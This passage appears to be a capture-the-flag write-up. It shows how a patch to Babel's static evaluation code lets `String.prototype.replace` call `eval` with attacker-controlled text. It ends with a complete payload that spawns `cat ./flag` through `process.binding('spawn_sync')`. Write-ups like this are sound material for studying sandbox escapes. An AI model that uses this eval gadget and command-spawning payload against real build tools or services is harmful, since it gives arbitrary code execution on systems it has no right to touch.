
The snippet below is the only code added the the original `evaluation.js`. The patch allows us to gain a reference to any global function:

```js
if (global.hasOwnProperty(name)) {
  return global[name];
}
```

The most useful function we can gain a reference to is `eval`. The goal will be to call it with user-controlled arguments.

Even with the patch, the code for handling static evaluation is still quite restrictive. If we want to call a function with an identifier as the callee (or a MemberExpression with an identifier as the object), we are limited by this snippet of code:

```js
const VALID_OBJECT_CALLEES = ["Number", "String", "Math"];
const VALID_IDENTIFIER_CALLEES = ["isFinite", "isNaN", "parseFloat", "parseInt", "decodeURI", "decodeURIComponent", "encodeURI", "encodeURIComponent", null, null];
const INVALID_METHODS = ["random"];
/* snip */
if (callee.isIdentifier() && !path.scope.getBinding(callee.node.name) && (isValidObjectCallee(callee.node.name) || isValidIdentifierCallee(callee.node.name))) {
    func = global[callee.node.name];
}
if (callee.isMemberExpression()) {
    const object = callee.get("object");
    const property = callee.get("property");
    if (object.isIdentifier() && property.isIdentifier() && isValidObjectCallee(object.node.name) && !isInvalidMethod(property.node.name)) {
    context = global[object.node.name];
    const key = property.node.name;
        if (Object.hasOwnProperty.call(context, key)) {
            func = context[key];
        }
    }
      /* snip */
}

```

Though we can easily control the arguments, the code checks the callee against a whitelist. We can only call safe functions, like `String.fromCharCode(123)`. `parseInt("12",10)` etc.

Another way that Babel allows us to execute a function call is through an indirect call, such as:

```js
String({toString: FUNCTION})
```

However, in this case, there will be no arguments passed into the function. As we need a way to call `eval` with our own arguments, this method is not useful.

That leads us to this last interesting snippet of code related to function calls:

```js
  if (path.isCallExpression()) {
    const callee = path.get("callee");
    let context;
    let func;
    /* snip */
    if (callee.isMemberExpression()) {
      const object = callee.get("object");
      const property = callee.get("property");
      /* snip */

      // Our savior!
      if (object.isLiteral() && property.isIdentifier()) {
        const type = typeof object.node.value;
        if (type === "string" || type === "number") {
          context = object.node.value;
          func = context[property.node.name];
        }
      }
    }
    if (func) {
      const args = path.get("arguments").map(arg => evaluateCached(arg, state));
      if (!state.confident) return;
      return func.apply(context, args);
    }
  }
```

If we have a MemberExpression where the object is a literal and the property is an identifier, we can call the function with arbitrary arguments. However, we still need a way to call `eval` and supply it controlled arguments. We can enumerate all the functions in `String.prototype` and `Number.prototype` to discover that `String.prototype.replace` takes in a callback function as its second argument. This callback function is called with the matched substring as its first argument. By using `eval` as the callback function, we can call it with any arbitrary arguments by using the template:

```js
"CODE TO EVAL".replace("CODE TO EVAL", eval)

```

Putting this all together, we can use the following payload to read and print the flag:

```js
'let result=process.binding("spawn_sync").spawn({file:"cat",args:["cat","./flag"],stdio:[{type:"pipe",readable:true,writable:false},{type:"pipe",readable:false,writable:true},{type:"pipe",readable:false,writable:true},],});let output=result.output[1].toString();console.log(output)'.replace('let result=process.binding("spawn_sync").spawn({file:"cat",args:["cat","./flag"],stdio:[{type:"pipe",readable:true,writable:false},{type:"pipe",readable:false,writable:true},{type:"pipe",readable:false,writable:true},],});let output=result.output[1].toString();console.log(output)',eval)
```